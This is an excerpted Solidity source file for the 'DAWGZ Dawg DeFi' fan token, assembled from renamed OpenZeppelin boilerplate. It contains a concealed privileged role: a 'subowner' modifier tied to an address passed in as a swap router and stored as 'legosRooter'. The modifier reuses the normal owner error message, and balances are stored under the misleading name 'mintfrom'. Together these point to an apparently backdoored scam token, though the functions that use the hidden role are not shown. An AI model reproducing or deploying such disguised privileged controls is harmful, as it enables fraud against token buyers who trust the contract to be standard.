...
/// https://x.com/DAWGZDawgDeFi


pragma solidity 0.8.29;

// DAWGZDawgDeFi fan token

interface DAWGZDawgDeFiinterface {
  /**
...
/*
 * @dev Provides information about the current execution DAWGZDawgDeFi20Burnable, including the
 ...
 */
abstract contract DAWGZDawgDeFi20Burnable {
...
// File: @openzeppelin/contracts/access/DAWGZDawgDeFi20Ownable.sol
 ...
 * the owner.
 */
abstract contract DAWGZDawgDeFi20Ownable is DAWGZDawgDeFi20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DAWGZDawgDeFi20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DAWGZDawgDeFi20Ownable: new owner is the zero address");
 ...
 * `SafeDAWGZDawgDeFi` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeDAWGZDawgDeFi {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeDAWGZDawgDeFi: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeDAWGZDawgDeFi: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeDAWGZDawgDeFi: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeDAWGZDawgDeFi: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeDAWGZDawgDeFi: modulo by zero");
  }
...
contract DAWGZDawgDeFiToken is DAWGZDawgDeFi20Burnable, DAWGZDawgDeFiinterface, DAWGZDawgDeFi20Ownable {
    
    using SafeDAWGZDawgDeFi for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "DAWGZ Dawg DeFi";
        _symbol = "DAWGZ Dawg DeFi";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {DAWGZDawgDeFiinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {DAWGZDawgDeFiinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "DAWGZDawgDeFi20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DAWGZDawgDeFiinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DAWGZDawgDeFiinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DAWGZDawgDeFiinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {DAWGZDawgDeFiinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DAWGZDawgDeFiinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "DAWGZDawgDeFiinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {DAWGZDawgDeFiinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "DAWGZDawgDeFiinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "DAWGZDawgDeFiinterface: transfer from the zero address");
        require(shippingto != address(0), "DAWGZDawgDeFiinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "DAWGZDawgDeFiinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "DAWGZDawgDeFiinterface: approve from the zero address");
        require(transporteur != address(0), "DAWGZDawgDeFiinterface: approve to the zero address");
